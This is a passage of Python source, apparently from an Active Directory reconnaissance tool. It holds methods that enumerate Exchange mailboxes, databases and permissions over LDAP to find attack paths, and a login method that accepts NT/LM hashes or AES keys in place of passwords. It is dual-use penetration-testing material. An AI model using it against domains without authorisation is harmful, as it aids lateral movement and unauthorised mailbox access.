	def get_exchangemailbox(self, identity=None, properties=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False, args=None):
		"""
		Enumerate Exchange mailboxes in the domain.
		
		Args:
			identity: User name to target (optional, if None all mailboxes are returned)
			properties: Properties to retrieve (optional)
			searchbase: Search base for the LDAP query (optional)
			args: Arguments object containing properties (optional)
			search_scope: LDAP search scope (default: SUBTREE)
			no_cache: Whether to use cache (default: False)
			no_vuln_check: Whether to skip vulnerability checks (default: False)
			raw: Whether to return raw LDAP entries (default: False)
		Returns:
			List of Exchange mailboxes with their properties
		"""
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		exchange_enum = ExchangeEnum(self)
		
		# Get Exchange mailboxes
		entries = exchange_enum.get_exchange_mailboxes(
			properties=properties,
			identity=identity,
			searchbase=searchbase,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		logging.debug(f"[Get-ExchangeMailbox] Found {len(entries)} Exchange mailboxes")
		
		return entries
		
	def get_exchangedatabase(self, identity=None, properties=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False, args=None):
		"""
		Enumerate Exchange mailbox databases in the domain.
		
		Args:
			identity: Database name to target (optional, if None all databases are returned)
			properties: Properties to retrieve (optional)
			searchbase: Search base for the LDAP query (optional)
			args: Arguments object containing properties (optional)
			search_scope: LDAP search scope (default: SUBTREE)
			no_cache: Whether to use cache (default: False)
			no_vuln_check: Whether to skip vulnerability checks (default: False)
		
		Returns:
			List of Exchange mailbox databases with their properties
		"""
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.configuration_dn
		
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		
		exchange_enum = ExchangeEnum(self)
		
		# Get Exchange databases
		entries = exchange_enum.get_exchange_databases(
			properties=properties,
			identity=identity,
			searchbase=searchbase,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		logging.debug(f"[Get-ExchangeDatabase] Found {len(entries)} Exchange databases")
		
		return entries
	
	def get_exchangepermissions(self, identity=None, properties=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False, args=None):
		"""
		Enumerate and analyze Exchange-specific permissions in the AD environment.
		
		This function queries Active Directory for Exchange servers and related objects,
		then analyzes the permissions on these objects to identify potential attack paths.
		
		Args:
			identity: Exchange server name to target (optional, if None all Exchange servers are returned)
			properties: Properties to retrieve (optional)
			searchbase: Search base for the LDAP query (optional)
			args: Arguments object containing properties (optional)
			search_scope: LDAP search scope (default: SUBTREE)
			no_cache: Whether to use cache (default: False)
			no_vuln_check: Whether to skip vulnerability checks (default: False)
			raw: Whether to return raw LDAP entries (default: False)
		Returns:
			List of Exchange objects with permission information and potential attack vectors
		"""
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.configuration_dn
		
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		
		exchange_enum = ExchangeEnum(self)
		
		# Query Exchange objects - we'll collect servers, mailboxes, and databases
		exchange_objects = []
		
		# Get Exchange servers
		servers = exchange_enum.get_exchange_servers(
			properties=properties,
			identity=identity,
			searchbase=searchbase,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		
		exchange_objects.extend(servers)

		logging.debug(f"[Get-ExchangePermissions] Found {len(servers)} Exchange servers")
		
		# Get Exchange mailboxes (limit to 100 to avoid performance issues)
		mailboxes = exchange_enum.get_exchange_mailboxes(
			properties=properties,
			identity=identity,
			searchbase=searchbase,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		
		exchange_objects.extend(mailboxes)
		
		logging.debug(f"[Get-ExchangePermissions] Found {len(mailboxes)} Exchange mailboxes")
		
		# Get Exchange databases
		databases = exchange_enum.get_exchange_databases(
			properties=properties,
			identity=identity,
			searchbase=searchbase,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		
		exchange_objects.extend(databases)
		
		logging.debug(f"[Get-ExchangePermissions] Found {len(databases)} Exchange databases")
		
		# Get Exchange organization
		organization = exchange_enum.get_exchange_organization(
			properties=properties,
			searchbase=None,  # Use default configuration container
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		
		exchange_objects.extend(organization)

		logging.debug(f"[Get-ExchangePermissions] Found {len(organization)} Exchange organization")
		
		# Analyze permissions
		results = exchange_enum.analyze_exchange_permissions(exchange_objects)
		
		# Format the results for output
		formatted_results = []
		for name, info in results.items():
			formatted_results.append({
				"attributes": {
					"Name": name,
					"ObjectType": info["ObjectType"],
					"Owner": info["Owner"],
					"Vulnerabilities": info["Vulnerabilities"],
					"Permissions": info["Permissions"]
				}
			})
		
		return formatted_results

	def login_as(self, username=None, password='', domain=None, nthash=None, lmhash=None, auth_aes_key=None, args=None):
		self.clear_cache()
		self.conn.close()
		if args:
			if hasattr(args, 'username'):
				self.conn.username = args.username
			if hasattr(args, 'password') and args.password:
				self.conn.password = args.password
			if hasattr(args, 'domain') and args.domain:
				self.conn.domain = args.domain
			if hasattr(args, 'nthash') and args.nthash:
				self.conn.nthash = args.nthash
			if hasattr(args, 'lmhash') and args.lmhash:
				self.conn.lmhash = args.lmhash
			if hasattr(args, 'auth_aes_key') and args.auth_aes_key:
				self.conn.auth_aes_key = args.auth_aes_key
		else:
			if username:
				self.conn.username = username
			if password:
				self.conn.password = password
			if domain:
				self.conn.domain = domain
			if nthash:
				self.conn.nthash = nthash
			if lmhash:
				self.conn.lmhash = lmhash
			if auth_aes_key:
				self.conn.auth_aes_key = auth_aes_key

		logging.info(f"[Login-As] Logging in as {self.conn.username}@{self.conn.domain}")
		try:
			self.ldap_server, self.ldap_session = self.conn.init_ldap_session()
			logging.info(f"[Login-As] Successfully logged in as {self.conn.username}@{self.conn.domain}")
			self._initialize_attributes_from_connection()
			return True
		except Exception as e:
			if self.args.stack_trace:
				raise e
			else:
				logging.error(f"[Login-As] Failed to login as {self.conn.username}@{self.conn.domain}: {e}")
				return False
